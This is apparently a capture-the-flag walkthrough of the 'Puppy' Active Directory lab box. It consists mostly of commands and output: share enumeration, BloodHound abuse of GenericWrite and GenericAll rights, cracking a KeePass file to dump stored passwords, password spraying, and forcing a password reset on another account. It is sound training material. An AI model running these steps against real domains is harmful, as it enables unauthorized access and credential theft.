@@ -1,0 +1,181 @@
+
+
+
+As is common in real life pentests, you will start the Puppy box with credentials for the following account: 
+levi.james / KingofAkron2025!
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient -L //10.10.11.70/ -U levi.james
+Password for [WORKGROUP\levi.james]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	DEV             Disk      DEV-SHARE for PUPPY-DEVS
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.11.70 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient //10.10.11.70/DEV -U levi.james 
+Password for [WORKGROUP\levi.james]:
+Try "help" to get a list of possible commands.
+smb: \> dir
+NT_STATUS_ACCESS_DENIED listing \*
+smb: \> ^C
+                                     
+
+┌──(root㉿kali)-[/home/kali]
+└─# bloodhound-python -u levi.james -p 'KingofAkron2025!' -c all -d puppy.htb -ns 10.10.11.70 -dc dc.puppy.htb --zip
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: puppy.htb
+INFO: Getting TGT for user
+
+levi-james has GenericWrite over Developers
+of which
+ant.edwards
+adam.silver
+jamie.williams
+are members
+
+ant.edwards has GenericAll over adam.silver
+who is a member of remote management users
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# bloodyAD -u levi.james -p 'KingofAkron2025!' -d puppy.htb --dc-ip 10.10.11.70 add groupMember Developers levi.james
+
+
+[+] levi.james added to Developers
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient //10.10.11.70/DEV -U levi.james                                                             
+Password for [WORKGROUP\levi.james]:
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                  DR        0  Sun Mar 23 03:07:57 2025
+  ..                                  D        0  Sat Mar  8 11:52:57 2025
+  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 03:09:12 2025
+  Projects                            D        0  Sat Mar  8 11:53:36 2025
+  recovery.kdbx                       A     2677  Tue Mar 11 22:25:46 2025
+
+		5080575 blocks of size 4096. 1612349 blocks available
+smb: \> cd Projects
+smb: \Projects\> ls
+  .                                   D        0  Sat Mar  8 11:53:36 2025
+  ..                                 DR        0  Sun Mar 23 03:07:57 2025
+
+		5080575 blocks of size 4096. 1612349 blocks available
+smb: \Projects\> cd ..
+smb: \> get recovery.kdbx
+getting file \recovery.kdbx of size 2677 as recovery.kdbx (24.7 KiloBytes/sec) (average 24.7 KiloBytes/sec)
+smb: \> 
+
+
+┌──(root㉿kali)-[/opt/john-git/run]
+└─# ./keepass2john /home/kali/recovery.kdbx 
+recovery:$keepass$*4*37*ef636ddf*67108864*19*4*bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf2662853527714*d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb92441470*03d9a29a67fb4bb500000400021000000031c1f2e6bf714350be5805216afc5aff0304000000010000000420000000bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf266285352771407100000000ab56ae17c5cebf440092907dac20a350b8b00000000014205000000245555494410000000ef636ddf8c29444b91f7a9a403e30a0c05010000004908000000250000000000000005010000004d080000000000000400000000040100000050040000000400000042010000005320000000d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb9244147004010000005604000000130000000000040000000d0a0d0a*31614848015626f2451cc4d07ce9a281a416c8e8c2ff8cc45c69ce1f4daef0e9
+                                                                                                                     
+┌──(root㉿kali)-[/opt/john-git/run]
+└─# /opt/john-git/run/john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [AES/Argon2 256/256 AVX2])
+Cost 1 (t (rounds)) is 37 for all loaded hashes
+Cost 2 (m) is 65536 for all loaded hashes
+Cost 3 (p) is 4 for all loaded hashes
+Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 0 for all loaded hashes
+Will run 4 OpenMP threads
+Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+Failed to use huge pages (not pre-allocated via sysctl? that's fine)
+liverpool        (recovery)     
+1g 0:00:00:09 DONE (2025-10-27 03:21) 0.1016g/s 3.659p/s 3.659c/s 3.659C/s purple..liverpool
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# echo 'liverpool' | keepassxc-cli export -f csv recovery.kdbx > output.csv
+Enter password to unlock recovery.kdbx: 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cat output.csv            
+"Group","Title","Username","Password","URL","Notes","TOTP","Icon","Last Modified","Created"
+"Root","JAMIE WILLIAMSON","","JamieLove2025!","puppy.htb","","","0","2025-03-10T08:57:58Z","2025-03-10T08:57:01Z"
+"Root","ADAM SILVER","","HJKL2025!","puppy.htb","","","0","2025-03-10T09:01:02Z","2025-03-10T08:58:07Z"
+"Root","ANTONY C. EDWARDS","","Antman2025!","puppy.htb","","","0","2025-03-10T09:00:02Z","2025-03-10T08:58:46Z"
+"Root","STEVE TUCKER","","Steve2025!","puppy.htb","","","0","2025-03-10T09:03:48Z","2025-03-10T09:01:26Z"
+"Root","SAMUEL BLAKE","","ILY2025!","puppy.htb","","","0","2025-03-10T09:03:39Z","2025-03-10T09:02:03Z"
+                                                                                                                     
+
+┌──(root㉿kali)-[/home/kali]
+└─# netexec smb puppy.htb -u ant.edwards -p Antman2025!
+SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
+SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 
+
+
+for good practice...
+
+┌──(root㉿kali)-[/home/kali]
+└─# netexec smb puppy.htb -u levi.james -p 'KingofAkron2025!' --rid-brute 2>&1 | grep 'SidTypeUser' | sed -E 's/.*: *[^\\]*\\([^ ]+).*/\1/' > users    
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cat users    
+Administrator
+Guest
+krbtgt
+DC$
+levi.james
+ant.edwards
+adam.silver
+jamie.williams
+steph.cooper
+steph.cooper_adm
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# netexec smb puppy.htb -u users -p passwords --continue-on-success
+SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
+SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\Administrator:JamieLove2025! STATUS_LOGON_FAILURE 
+SMB         10.10.11.70     445    DC               [-] PUPPY.
+...
+
+
+ant.edwards is the only working user/pass combo
+
+┌──(root㉿kali)-[/home/kali]
+└─# bloodyAD --host 10.10.11.70 -d puppy.htb -u ant.edwards -p 'Antman2025!' set password 'adam.silver' 'Password1!'
+[+] Password changed successfully!
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# netexec smb puppy.htb -u adam.silver -p Password1!
+SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
+SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:Password1! STATUS_ACCOUNT_DISABLED 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# bloodyAD --host 10.10.11.70 -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac 'adam.silver' -f ACCOUNTDISABLE
+[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
